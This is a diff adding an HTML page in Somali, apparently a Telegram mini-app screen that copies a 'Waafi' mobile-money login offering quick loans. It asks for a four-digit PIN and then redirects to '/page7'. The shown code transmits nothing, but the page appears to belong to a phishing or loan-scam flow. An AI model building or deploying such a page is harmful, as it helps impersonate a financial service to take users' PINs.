@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - Galitaanka</title>
+
+    <!-- ✅ FIXED Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { font-family: -apple-system, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        
+        .header-box { width: 100%; background: linear-gradient(to bottom, #82d13d, #a3e635); padding: 40px 20px; color: white; text-align: center; }
+        
+        .footer-box { 
+            width: 100%; 
+            background: linear-gradient(to top, #82d13d, #a3e635); 
+            padding: 50px 20px 30px; 
+            color: white; 
+            text-align: center; 
+            margin-top: auto;
+            border-top-left-radius: 50% 20px;
+            border-top-right-radius: 50% 20px;
+        }
+        
+        .logo-text { font-size: 36px; font-weight: bold; margin: 0; }
+        .sub-text { font-size: 15px; margin-top: 8px; opacity: 0.9; }
+        .version-text { font-size: 12px; margin-top: 15px; opacity: 0.8; }
+        .terms-text { font-size: 11px; margin-top: 15px; padding: 0 40px; line-height: 1.4; }
+
+        .main-content { width: 90%; max-width: 400px; margin-top: 40px; text-align: center; flex-grow: 1; }
+        h2 { color: #555; font-size: 24px; margin-bottom: 25px; }
+
+        .phone-display { border: 2px solid #82d13d; border-radius: 12px; padding: 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 40px; font-size: 20px; }
+        .flag-icon { font-size: 24px; }
+
+        .pin-label { color: #888; margin-bottom: 20px; font-size: 16px; }
+        .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; }
+
+        .pin-input-group { display: flex; gap: 8px; }
+        .pin-box { width: 55px; height: 55px; border: 1.5px solid #82d13d; border-radius: 10px; text-align: center; font-size: 24px; font-weight: bold; }
+
+        .toggle-eye { font-size: 22px; cursor: pointer; margin-left: 10px; }
+
+        .forgot-pin { color: #888; font-size: 14px; margin-top: 15px; display: block; }
+
+        .btn-gal { 
+            background-color: #e0e0e0; 
+            color: #fff; 
+            border: none; 
+            width: 100%; 
+            padding: 18px; 
+            border-radius: 10px; 
+            font-size: 20px; 
+            font-weight: bold; 
+            margin-top: 60px; 
+            cursor: not-allowed;
+        }
+
+        .btn-gal.active { 
+            background-color: #82d13d; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    <p class="logo-text">Waafi</p>
+    <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
+</div>
+
+<div class="main-content">
+    <h2>Gal</h2>
+
+    <div class="phone-display">
+        <span class="flag-icon">🇸🇴</span>
+        <span id="displayPhone">+252 076055999</span>
+    </div>
+
+    <p class="pin-label">Geli PIN-kaaga</p>
+    
+    <div class="pin-container">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box">
+            <input type="password" maxlength="1" class="pin-box">
+            <input type="password" maxlength="1" class="pin-box">
+            <input type="password" maxlength="1" class="pin-box">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️</span>
+    </div>
+
+    <a href="#" class="forgot-pin">PIN-ka ma iloobtay?</a>
+
+    <button id="loginBtn" class="btn-gal" disabled>GAL</button>
+</div>
+
+<div class="footer-box">
+    <p class="logo-text">Waafi</p>
+    <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
+    <p class="version-text">v2.1.3P</p>
+    <p class="terms-text">Galitaanka markaad gasho waad ogolaatay Shuruudaha iyo Xaaladaha</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            if (box.value.length === 1 && index < 3) {
+                pinBoxes[index + 1].focus();
+            }
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    eye.addEventListener('click', () => {
+        pinBoxes.forEach(box => {
+            box.type = box.type === "password" ? "text" : "password";
+        });
+        eye.innerText = eye.innerText === "👁️" ? "🫣" : "👁️";
+    });
+
+    loginBtn.addEventListener('click', () => {
+        window.location.href = "/page7";
+    });
+
+    // Telegram init
+    window.Telegram?.WebApp?.expand();
+
+    // Auto-fill phone
+    const phone = localStorage.getItem('phone');
+    if (phone) {
+        document.getElementById('displayPhone').innerText = `+252 ${phone}`;
+    }
+});
+</script>
+
+</body>
+</html>
